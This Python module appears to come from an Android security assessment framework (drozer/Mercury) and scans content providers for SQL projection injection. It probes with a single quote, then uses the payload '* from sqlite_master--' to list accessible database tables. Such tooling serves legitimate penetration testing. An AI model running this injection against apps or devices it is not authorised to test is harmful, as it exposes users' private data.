from mwr.droidhg.modules import common, Module
from mwr.droidhg.reflection import ReflectionException

class SqlTableDump(Module, common.ClassLoader, common.FileSystem, common.PackageManager, common.Provider, common.Strings, common.ZipFile, common.Vulnerability, common.TableFormatter):

    name = "Test for accessible SQL tables in content providers with SQL injection vulnerabilities."
    description = "Enumerate SQL tables accessible via SQL (projection) Injection vulnerabilities."
    examples = ""
    author = "Rijnard"
    date = "2013-01-23"
    license = "MWR Code License"
    path = ["scanner", "provider"]

    def add_arguments(self, parser):
        parser.add_argument("package_or_uri", help="specify a package to search", metavar="package or uri", nargs="?")
        
    def execute(self, arguments):
        results = []
        if arguments.package_or_uri != None and arguments.package_or_uri.startswith("content://"):
            results.append(self.__test_uri(arguments.package_or_uri))
        else:
            for uri in self.findAllContentUris(arguments.package_or_uri):
                results.append(self.__test_uri(uri))
        
        if results: 
            self.stdout.write('\n'.join(filter(None, results)) + '\n')
        else:
            self.stdout.write("No results found.\n")

    def __test_uri(self, uri):
        try:
            self.contentResolver().query(uri, projection=["'"])
        except ReflectionException as e:
            if e.message.find("unrecognized token") >= 0: # if there's a projection injection
                try:
                    cursor = self.contentResolver().query(uri, projection=["* from sqlite_master--"])
                    resultSet = self.getResultSet(cursor)
                    listOfTables = filter(lambda x: str(x[0]) == 'table', resultSet[1:]) # exclude indexes
                    return "Accessible tables for uri " + uri + ":\n  " + \
                                   '\n  '.join(str(x[1]) for x in listOfTables) # join on table names
                except:
                    pass
